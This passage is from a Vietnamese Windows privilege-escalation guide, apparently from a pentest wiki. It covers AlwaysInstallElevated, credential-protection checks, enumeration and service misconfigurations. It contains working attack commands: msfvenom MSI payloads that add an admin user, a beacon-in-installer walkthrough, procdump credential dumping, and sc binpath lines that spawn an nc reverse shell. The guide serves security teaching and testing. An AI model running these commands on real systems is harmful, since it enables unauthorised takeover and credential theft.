Để biết thêm thông tin về luồng tấn công, hãy xem [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Nếu** 2 khóa registry này được **bật** (giá trị là **0x1**), thì người dùng với bất kỳ mức đặc quyền nào cũng có thể **cài đặt** (thực thi) các tệp `*.msi` với quyền NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Nếu bạn có một phiên meterpreter, bạn có thể tự động hóa kỹ thuật này bằng module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Dùng lệnh `Write-UserAddMSI` từ power-up để tạo một binary Windows MSI trong thư mục hiện tại nhằm leo thang đặc quyền. Script này ghi ra một trình cài đặt MSI được biên dịch sẵn, yêu cầu thêm người dùng/nhóm (vì vậy bạn cần quyền truy cập GIU):

```
Write-UserAddMSI
```

Chỉ cần thực thi binary đã tạo để leo thang đặc quyền.

### MSI Wrapper

Đọc tutorial này để tìm hiểu cách tạo MSI wrapper bằng công cụ này. Lưu ý rằng bạn có thể bọc một file "**.bat**" nếu bạn **chỉ** muốn **thực thi** **các dòng lệnh**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Tạo MSI bằng WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Tạo MSI bằng Visual Studio

- **Tạo** một **Windows EXE TCP payload** mới bằng Cobalt Strike hoặc Metasploit tại `C:\privesc\beacon.exe`
- Mở **Visual Studio**, chọn **Create a new project** và nhập "installer" vào hộp tìm kiếm. Chọn project **Setup Wizard** rồi nhấp **Next**.
- Đặt tên cho project, chẳng hạn **AlwaysPrivesc**, dùng **`C:\privesc`** làm vị trí, chọn **place solution and project in the same directory**, rồi nhấp **Create**.
- Tiếp tục nhấp **Next** cho đến bước 3/4 (chọn các file cần đưa vào). Nhấp **Add** và chọn Beacon payload bạn vừa tạo. Sau đó nhấp **Finish**.
- Chọn project **AlwaysPrivesc** trong **Solution Explorer** và trong **Properties**, đổi **TargetPlatform** từ **x86** sang **x64**.
  - Bạn có thể thay đổi các thuộc tính khác, chẳng hạn **Author** và **Manufacturer**, để ứng dụng đã cài trông hợp pháp hơn.
- Nhấp chuột phải vào project và chọn **View > Custom Actions**.
- Nhấp chuột phải vào **Install** và chọn **Add Custom Action**.
- Nhấp đúp vào **Application Folder**, chọn file **beacon.exe** rồi nhấp **OK**. Việc này đảm bảo beacon payload được thực thi ngay khi chạy installer.
- Trong **Custom Action Properties**, đổi **Run64Bit** thành **True**.
- Cuối cùng, **build project**.
  - Nếu xuất hiện cảnh báo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, hãy đảm bảo bạn đã đặt platform thành x64.

### Cài đặt MSI

Để chạy quá trình **cài đặt** file `.msi` độc hại trong **nền:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Để khai thác lỗ hổng này, bạn có thể dùng: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Các cài đặt này quyết định những gì được **ghi nhật ký**, vì vậy bạn nên chú ý.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, sẽ rất hữu ích nếu biết nhật ký được gửi đến đâu.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** được thiết kế để **quản lý mật khẩu Administrator cục bộ**, đảm bảo mỗi máy tính đã tham gia domain có mật khẩu **riêng biệt, được tạo ngẫu nhiên và cập nhật thường xuyên**. Các mật khẩu này được lưu trữ an toàn trong Active Directory và chỉ những người dùng được cấp đủ quyền thông qua ACL mới có thể truy cập, cho phép họ xem mật khẩu admin cục bộ nếu được ủy quyền.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Khi được bật, **mật khẩu dạng plain-text sẽ được lưu trong LSASS** (Local Security Authority Subsystem Service).\
[**Tìm hiểu thêm về WDigest tại trang này**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Bảo vệ LSA

Bắt đầu từ **Windows 8.1**, Microsoft đã giới thiệu tính năng bảo vệ nâng cao cho Local Security Authority (LSA) nhằm **ngăn chặn** các tiến trình không đáng tin cậy cố **đọc bộ nhớ của LSA** hoặc chèn mã, qua đó tăng cường bảo mật cho hệ thống.\
[**Tìm hiểu thêm về tính năng bảo vệ LSA tại đây**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** được giới thiệu trong **Windows 10**. Tính năng này bảo vệ thông tin xác thực được lưu trữ trên thiết bị khỏi các mối đe dọa như tấn công pass-the-hash. [**Bạn có thể xem thêm thông tin về Credential Guard tại đây.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Thông tin xác thực được lưu trong bộ nhớ đệm

**Thông tin xác thực miền** được xác thực bởi **Local Security Authority** (LSA) và được các thành phần của hệ điều hành sử dụng. Khi dữ liệu đăng nhập của người dùng được xác thực bởi một security package đã đăng ký, thông tin xác thực miền của người dùng thường được thiết lập.\
[**Tìm hiểu thêm về thông tin xác thực được lưu trong bộ nhớ đệm tại đây**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Người dùng & Nhóm

### Liệt kê người dùng & nhóm

Bạn nên kiểm tra xem nhóm nào mà bạn thuộc về có quyền hạn đáng chú ý không.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Nhóm đặc quyền

Nếu bạn **thuộc một nhóm đặc quyền, bạn có thể nâng cao đặc quyền**. Tìm hiểu về các nhóm đặc quyền và cách lạm dụng chúng để nâng cao đặc quyền tại đây:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Tìm hiểu thêm** về **token** trên trang này: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Xem trang sau để **tìm hiểu về các token đáng chú ý** và cách lạm dụng chúng:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Người dùng đã đăng nhập / Phiên

```bash
qwinsta
klist sessions
```

### Thư mục chính

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Chính sách mật khẩu

```bash
net accounts
```

### Lấy nội dung trong bảng tạm

```bash
powershell -command "Get-Clipboard"
```

## Các tiến trình đang chạy

### Quyền của tệp và thư mục

Trước hết, khi liệt kê các tiến trình, **hãy kiểm tra xem mật khẩu có xuất hiện trong dòng lệnh của tiến trình hay không**.\
Kiểm tra xem bạn có thể **ghi đè một binary đang chạy** hay có quyền ghi vào thư mục chứa binary để khai thác các khả năng xảy ra [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Luôn kiểm tra xem có [**electron/cef/chromium debuggers** đang chạy hay không; bạn có thể lợi dụng chúng để leo thang đặc quyền](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Một debugger listener có thể chỉ tồn tại trong thời gian ngắn, vì vậy việc không thấy nó trong một lần chụp snapshot cổng thụ động không chứng minh rằng nó chưa từng bị lộ. Đối chiếu mọi listener được phát hiện với PID, chủ sở hữu tiến trình và khả năng truy cập của người dùng có đặc quyền thấp hơn; chỉ tên ứng dụng hoặc debug flag không đủ để chứng minh có thể thực thi mã xuyên người dùng. Hãy duy trì việc liệt kê thông thường ở chế độ thụ động, thay vì gửi lệnh debugger.

**Kiểm tra quyền của các binary thuộc tiến trình**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kiểm tra quyền trên các thư mục chứa tệp nhị phân của tiến trình (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Thư mục dynamic preprocessor của Snort

Snort 2 có thể tải shared library từ `dynamicpreprocessor directory` được khai báo trong cấu hình được chọn bằng `snort.exe -c <config>`. Với tác vụ theo lịch hoặc dịch vụ chạy Snort bằng tài khoản khác, hãy kiểm tra chính xác cấu hình đó và ACL của thư mục module được khai báo. Nếu token của bạn có thể tạo file tại đó, đường dẫn này là một nơi cần xem xét về khả năng thực thi mã khi tác vụ hoặc dịch vụ tải module lần tiếp theo. Hãy xác minh các quyền hiệu lực của tài khoản chạy, cấu hình đang hoạt động, khả năng tương thích của module và mọi hạn chế deny hoặc share; chỉ riêng việc thư mục có thể ghi không chứng minh được khả năng leo thang đặc quyền. [Tài liệu về dynamic preprocessor của Snort](https://www.snort.org/documents/dpx-readme) mô tả việc tải module khi chạy.

### Dịch vụ web có đặc quyền với document root có thể ghi

Trên bản cài đặt Apache cho Windows, hãy đối chiếu đường dẫn executable của dịch vụ và tài khoản chạy với `DocumentRoot` trong `httpd.conf` đang hoạt động. Với bố cục XAMPP thông thường, hãy kiểm tra `C:\xampp\apache\conf\httpd.conf` và ACL trên document root được cấu hình, thường là `C:\xampp\htdocs`. Nếu người dùng có ít đặc quyền hơn có thể tạo file trong thư mục đó khi Apache chạy dưới quyền `LocalSystem`, việc thực thi mã phía server có thể vượt qua ranh giới đặc quyền của host. Xác nhận dịch vụ đang chạy, đường dẫn chính xác được phục vụ và handler phía server xử lý loại file đó; chỉ riêng việc document root có thể ghi chỉ chứng minh khả năng tạo file. Kiểm tra ACL mà không ghi file thăm dò:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Với một cài đặt WAMP thông thường, service có thể trỏ đến đường dẫn có phiên bản `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (hoặc `C:\wamp\...` nếu dùng bố cục 32-bit), với cấu hình nằm cạnh đó trong `conf\httpd.conf` và thư mục gốc mặc định là `C:\wamp64\www` hoặc `C:\wamp\www`. Hãy kiểm tra đồng thời image chính xác của service, danh tính chạy service, `DocumentRoot` hiệu lực (bao gồm việc mở rộng `${INSTALL_DIR}` và các ghi đè virtual host), cùng root ACL. Một thư mục WAMP có quyền ghi không chứng minh Apache chạy dưới quyền `SYSTEM` hoặc thực thi tệp được gửi lên. [Apache mô tả cách Windows service chọn cấu hình](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### IIS root có quyền ghi và danh tính mạng của application pool

Với IIS, hãy ánh xạ một thư mục vật lý có quyền ghi tới một **site/application đang hoạt động** trong `applicationHost.config`, sau đó xác định pool được cấu hình cho nó và handler phía server. Mã đặt trong thư mục được phục vụ chỉ chạy dưới danh tính của pool nếu IIS xử lý loại tệp đó và route có thể truy cập được. Hãy kiểm tra quyền tạo tệp hiệu lực của người dùng hiện tại, trạng thái runtime của site, handler và các ghi đè theo từng đường dẫn trước khi xem thư mục có quyền ghi là khả năng thực thi mã.

Biên dịch động ASP.NET tạo ra một đường dẫn riêng cần xem xét: các tệp được tạo trong thư mục biên dịch của ứng dụng. Mặc định, thư mục này là `Temporary ASP.NET Files` nằm trong bản cài .NET Framework tương ứng, nhưng `<compilation tempDirectory>` của ứng dụng có thể thay đổi vị trí. [Microsoft ghi rõ vị trí và các thư mục con theo từng ứng dụng](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) và [khuyến nghị cách ly thư mục biên dịch khi các application pool không tin cậy lẫn nhau](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Nếu token có đặc quyền thấp hơn có thể sửa source được tạo trong cache của **ứng dụng cụ thể**, hãy xác định liệu ứng dụng đó có biên dịch lại tệp dưới [danh tính worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) có đặc quyền cao hơn hay không. Chỉ riêng ACL của tệp hoặc thư mục không chứng minh được khả năng thực thi mã: hãy đối chiếu cache với ứng dụng đang hoạt động, token hiệu lực và ACL, thiết lập biên dịch, danh tính process và thời điểm biên dịch lại. Chỉ xem xét metadata ở chế độ chỉ đọc; không kích hoạt biên dịch hoặc sửa các tệp cache trong quá trình liệt kê.

Một IIS pool được cấu hình là `ApplicationPoolIdentity` hoặc `NetworkService` thường xác thực với tài nguyên domain bằng **tài khoản máy chủ**, dù token cục bộ có thể có đặc quyền thấp. `LocalSystem` vốn đã có đặc quyền cao trên máy cục bộ và cũng dùng tài khoản máy chủ trên mạng; `LocalService` thường sử dụng thông tin xác thực mạng ẩn danh. Pool `SpecificUser` sử dụng tài khoản được cấu hình cho nó. [Microsoft mô tả các loại danh tính này](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) và [danh tính mạng của application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Thiết lập danh tính bị lược bỏ có thể kế thừa mặc định của pool; các mặc định này khác nhau giữa các thế hệ IIS, vì vậy hãy xác định cấu hình hiệu lực thay vì phỏng đoán từ tên pool. Nếu thực thi mã đạt đến pool có danh tính mạng là tài khoản máy chủ, hãy đánh giá quyền thư mục của **chính máy chủ đó**. [DCSync](../active-directory-methodology/dcsync.md) yêu cầu quyền replication trên naming context của domain; ticket của tài khoản máy hoặc vai trò của host không tự chứng minh được các quyền đó. Việc liệt kê thụ động nên kiểm tra cấu hình và ACL mà không tải tệp lên, tạo xác thực mạng hoặc yêu cầu ticket.

Với một ASP.NET handler có thể đọc được và khởi chạy process phụ, hãy lần theo mọi giá trị có nguồn gốc từ request qua các bước xác thực, giải mã, kiểm tra hợp lệ và tạo lệnh. Handler nối token đã giải mã vào `ProcessStartInfo("cmd", "/c ...")` có thể cho phép các ký tự đặc biệt của shell thay đổi lệnh; [Microsoft mô tả các ký tự đặc biệt của `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Hãy xác định rằng caller không đáng tin cậy thực sự có thể kiểm soát giá trị đã giải mã và truy cập handler, sau đó xác định danh tính application pool hiệu lực hoặc danh tính impersonation, cùng danh tính của process con. Một dòng source đọc được, listener localhost hoặc điểm yếu về định dạng token không tự chứng minh được khả năng thực thi lệnh có đặc quyền. Hãy xem xét source và cấu hình pool mà không gửi request giả mạo hoặc chạy helper trong quá trình liệt kê thụ động.

Với PHP service trên Windows, một đường dẫn do request kiểm soát được truyền vào [`include` hoặc `require`](https://www.php.net/manual/en/function.include.php) có thể đánh giá một tệp PHP mà người dùng đặc quyền thấp hơn có thể ghi, dưới danh tính của worker. Hãy xác nhận request có thể đi tới câu lệnh đó, đường dẫn sau khi phân giải trỏ tới tệp mà người dùng đặc quyền thấp hơn có thể sửa và worker có thể đọc, các hạn chế đường dẫn PHP áp dụng cho phép include, và worker thực sự chạy với đặc quyền cao hơn. Listener loopback hoặc tệp có quyền ghi không đủ để xác lập chuỗi này; hãy kiểm tra source, danh tính service và ACL của tệp mà không gọi endpoint trong quá trình liệt kê thụ động.

### Khai thác mật khẩu trong bộ nhớ

Bạn có thể tạo memory dump của một process đang chạy bằng **procdump** từ sysinternals. Các service như FTP có **thông tin xác thực ở dạng văn bản thuần trong bộ nhớ**; hãy thử dump bộ nhớ và đọc thông tin xác thực.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Ứng dụng GUI không an toàn

**Ứng dụng chạy với quyền SYSTEM có thể cho phép người dùng mở CMD hoặc duyệt thư mục.**

Ví dụ: "Windows Help and Support" (Windows + F1), tìm "command prompt", nhấp vào "Click to open Command Prompt"

### Nhập tệp dự án với quyền cao

Ứng dụng tự động mở dự án từ thư mục thả xuống có thể ghi bởi người dùng cấp thấp sẽ vượt qua ranh giới tin cậy đầu vào dưới tài khoản của ứng dụng nhập. Hãy kiểm tra **đường dẫn có thể ghi chính xác**, tiến trình hoặc tác vụ mở đường dẫn đó, danh tính hiệu lực của tiến trình và bản dựng của trình phân tích cú pháp. Một [lỗi lịch sử khi mở/khôi phục dự án Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) cho phép sử dụng XML external entity trong metadata dự án; một network entity trên Windows có thể khiến tài khoản nhập xác thực nếu [chính sách SMB outbound và NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) cho phép. Đây là manh mối về lộ thông tin xác thực, không phải quyền truy cập administrator ngay lập tức: cần có một đường dẫn riêng được cho phép hoặc có lỗ hổng để sử dụng phản hồi, đồng thời phải đánh giá các bản dựng hiện tại theo trạng thái vá thực tế. Không mở dự án được tạo thủ công trong quá trình liệt kê thụ động; hãy kiểm tra quy trình nhập và ACL.

## Services

Quyền [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) trên đối tượng Service Control Manager (SCM) tách biệt với quyền trên một service hiện có. Một yêu cầu quyền truy cập chỉ đọc thành công tới [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) với quyền đó là manh mối cần xem xét, không phải bằng chứng rằng service mới có thể chạy. [`CreateService` trả về một handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) với quyền truy cập service được yêu cầu khi tạo; mở lại service sau đó sẽ thực hiện một kiểm tra quyền truy cập riêng và có thể thất bại ngay cả khi có thể dùng handle ban đầu. Hãy xác minh riêng token cục bộ hoặc từ xa hiệu lực, quyền được cấp cho handle, tài khoản service, chính sách khởi động và đường dẫn executable. Không tạo hoặc khởi động service trong quá trình liệt kê thụ động.

Với đường dẫn cài đặt service từ xa, hãy đối chiếu các quyền SCM đó với một share trên máy đích mà **cùng một lần đăng nhập mạng** có thể ghi, ACL NTFS bên dưới share đó và đường dẫn executable cục bộ mà tài khoản service có thể chạy. Tài khoản không phải admin có thể vượt qua ranh giới này nếu tồn tại đồng thời các quyền SCM rộng bất thường và đường dẫn đặt tệp phù hợp; không nhất thiết phải có administrative share. Chỉ có quyền ghi vào share hoặc chỉ có manh mối về quyền tạo service trên SCM không chứng minh rằng service mới có thể khởi động với danh tính cao hơn.

Một service hiện có có thể gọi executable trợ giúp khi khởi động, tắt hoặc trong một sự kiện vòng đời khác, ngay cả khi executable đó không có trong `ImagePath`. Nếu tên executable trợ giúp được phân giải thành một thư mục người dùng cấp thấp có thể ghi và service chạy với danh tính cao hơn, tệp trợ giúp còn thiếu có thể là ứng viên để thay thế trong một số điều kiện. Hãy xác nhận **mã service thực tế hoặc lời gọi trợ giúp được ghi lại**, đường dẫn executable sau khi phân giải và thứ tự tìm kiếm, quyền tạo thư mục, danh tính service và khả năng kích hoạt vòng đời. Một thư mục service có thể ghi hoặc một tệp còn thiếu không đủ để chứng minh service sẽ tải tệp đó; khi xem xét thụ động, không khởi động hoặc dừng service.

Với một service hiện có, [`SERVICE_START` cho phép cung cấp đối số cho `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); quyền này khác với [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Hãy xem xét mã hoặc giao diện được ghi lại của service trước khi coi quyền khởi động là nhiều hơn một quyền điều khiển. Nếu service sử dụng đối số do người gọi chọn làm đường dẫn log hoặc export, hãy xác minh danh tính service, luồng xử lý chính xác từ đối số đến thao tác ghi, các giới hạn đường dẫn và quyền trên **tệp được tạo**. Ghi vào thư mục được bảo vệ chỉ có thể dẫn đến leo thang quyền nếu có một thành phần tiêu thụ hoặc loader có quyền cao riêng biệt chấp nhận tệp đó; chỉ có log ghi được hoặc quyền khởi động là chưa đủ. Khi kiểm kê thụ động, không khởi động service hoặc tạo tệp kiểm tra.

Với agent giám sát NSClient++, tệp `nsclient.ini` có thể đọc được là một **manh mối cần xem xét cấu hình**: tệp này có thể chứa thông tin đăng nhập web, trong khi `boot.ini` có thể chuyển hướng cấu hình sang một vị trí khác. Hãy kiểm tra tài khoản service thực tế, listener WEB và chính sách truy cập, cũng như vai trò đã xác thực có thể thay đổi cài đặt hoặc script hay không. Để thực thi với quyền cao, cần có thêm `CheckExternalScripts` (hoặc một đường dẫn thực thi khác được bật), quyền hiệu lực để đăng ký hoặc sửa đổi một lệnh và một trigger chạy lệnh đó dưới danh tính service. Listener chỉ liên kết với loopback vẫn có thể được người dùng cục bộ truy cập, nhưng riêng đường dẫn tệp, mật khẩu hoặc listener không chứng minh được các quyền đó. Khi xem xét thụ động, hãy kiểm tra metadata và quyền mà không hiển thị secrets hoặc gọi web API. Xem [bố cục tệp NSClient++](https://nsclient.org/docs/concepts/file-layout/), [hướng dẫn bảo mật web và script](https://nsclient.org/docs/setup/securing/) và [cấu hình external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Với service có `ImagePath` là `nssm.exe`, hãy kiểm tra tài khoản chạy thực tế của service và giá trị `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM lưu ứng dụng con tại đó](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), còn `AppDirectory` là thư mục làm việc được cấu hình. Hãy kiểm tra executable con và ACL của các thư mục cha trước khi cho rằng chỉ cần xét quyền của wrapper là đủ để xác định ranh giới của service. Endpoint WCF hoặc SOAP cục bộ do ứng dụng con này cung cấp là một manh mối cần xem xét riêng: xác nhận listener có thể được người dùng có quyền thấp truy cập, thao tác chính xác có chấp nhận đầu vào của họ hay không và ứng dụng con của service có thực thi thao tác không an toàn với danh tính cao hơn hay không. Tài khoản service, URL endpoint hoặc một đường dẫn có thể ghi không tự nó chứng minh được khả năng leo thang quyền; tránh gọi các thao tác của service trong quá trình liệt kê thụ động.

Với thao tác WCF tùy chỉnh, hãy lần theo chuỗi do người gọi kiểm soát đến bất kỳ PowerShell runspace nào. [`Pipeline.Commands.AddScript` thêm văn bản script](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), còn [`Pipeline.Invoke` chạy pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Một [`netTcpBinding` với thông tin xác thực Windows cho transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) xác thực client, nhưng cần kiểm tra riêng quyền gọi **thao tác cụ thể đó** và danh tính hiệu lực của runspace. Đường dẫn từ đầu vào của người gọi có quyền thấp đến `AddScript` dưới danh tính service có quyền cao là một ranh giới thực thi mã; chỉ có cổng đang lắng nghe, client đã xác thực hoặc một phương thức không được sử dụng trong assembly không liên quan thì không phải bằng chứng. Hãy kiểm tra tĩnh service đã triển khai, contract, quyền hạn và cài đặt impersonation mà không gọi endpoint trong quá trình liệt kê.

Service Triggers cho phép Windows khởi động service khi xảy ra một số điều kiện nhất định (hoạt động của named pipe/RPC endpoint, sự kiện ETW, tình trạng khả dụng của IP, thiết bị được kết nối, làm mới GPO, v.v.). Ngay cả khi không có quyền SERVICE_START, bạn vẫn thường có thể khởi động service có quyền cao bằng cách kích hoạt trigger của chúng. Xem các kỹ thuật liệt kê và kích hoạt tại đây:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Dịch vụ thu thập chẩn đoán Visual Studio

Các bản cài đặt Visual Studio có công cụ C/C++ có thể bao gồm `VSStandardCollectorService150`, một dịch vụ chẩn đoán được cấu hình chạy với quyền `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) sử dụng junction và cuộc đua object-manager-link để chuyển hướng việc đặt lại DACL của service. Quá trình leo thang được chứng minh cũng yêu cầu có đường dẫn sửa chữa MSI khả dụng của Visual Studio Setup WMI Provider và mục tiêu `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Thành phần này đã được sửa vào tháng 1 năm 2024.

Để sàng lọc thụ động, hãy kiểm tra tài khoản và đường dẫn binary của service đó, xem đường dẫn Setup WMI compiler có tồn tại hay không và xác minh trạng thái vá của thành phần đã cài đặt. Chỉ riêng một mục service, phiên bản sản phẩm Visual Studio hoặc tệp compiler không đủ để chứng minh máy chủ dễ bị tấn công. Việc kiểm tra không cần khởi động service hoặc chạy quy trình sửa chữa.

Lấy danh sách các service:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Quyền

Bạn có thể dùng **sc** để lấy thông tin về một service

```bash
sc qc <service_name>
```

Nên có binary **accesschk** từ _Sysinternals_ để kiểm tra mức đặc quyền cần thiết cho từng service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Nên kiểm tra xem "Authenticated Users" có thể chỉnh sửa dịch vụ nào không:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Có thể tải accesschk.exe cho XP tại đây](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Bật dịch vụ

Nếu bạn gặp lỗi này (ví dụ với SSDPSRV):

_Lỗi hệ thống 1058 đã xảy ra._\
_Không thể khởi động dịch vụ vì dịch vụ đã bị vô hiệu hóa hoặc không có thiết bị nào được bật liên kết với dịch vụ._

Bạn có thể bật dịch vụ bằng cách dùng

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Lưu ý rằng service upnphost phụ thuộc vào SSDPSRV để hoạt động (đối với XP SP1)**

**Một cách khắc phục khác** cho vấn đề này là chạy:

```
sc.exe config usosvc start= auto
```

### **Sửa đổi đường dẫn binary của service**

Trong trường hợp nhóm "Authenticated users" có quyền **SERVICE_ALL_ACCESS** trên một service, bạn có thể sửa đổi binary thực thi của service. Để sửa đổi và thực thi **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Khởi động lại dịch vụ

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Có thể nâng cao đặc quyền thông qua nhiều quyền khác nhau:

- **SERVICE_CHANGE_CONFIG**: Cho phép cấu hình lại binary của service.
- **WRITE_DAC**: Cho phép cấu hình lại quyền, từ đó có thể thay đổi cấu hình service.
- **WRITE_OWNER**: Cho phép chiếm quyền sở hữu và cấu hình lại quyền.
- **GENERIC_WRITE**: Kế thừa khả năng thay đổi cấu hình service.
- **GENERIC_ALL**: Cũng kế thừa khả năng thay đổi cấu hình service.

Có thể sử dụng _exploit/windows/local/service_permissions_ để phát hiện và khai thác lỗ hổng này.

### Quyền yếu trên binary của service

Nếu một service chạy dưới tài khoản **`LocalSystem`**, **`LocalService`**, **`NetworkService`** hoặc tài khoản domain có đặc quyền, nhưng **người dùng có ít đặc quyền có thể sửa EXE của service hoặc thư mục cha của nó**, service thường có thể bị chiếm quyền bằng cách **thay thế binary rồi khởi động lại service**.

**Kiểm tra xem bạn có thể sửa binary mà service thực thi hay không**, hoặc bạn có **quyền ghi vào thư mục** chứa binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bạn có thể lấy danh sách mọi binary được service thực thi bằng **wmic** (không nằm trong system32) và kiểm tra quyền của mình bằng **icacls**:

```bash
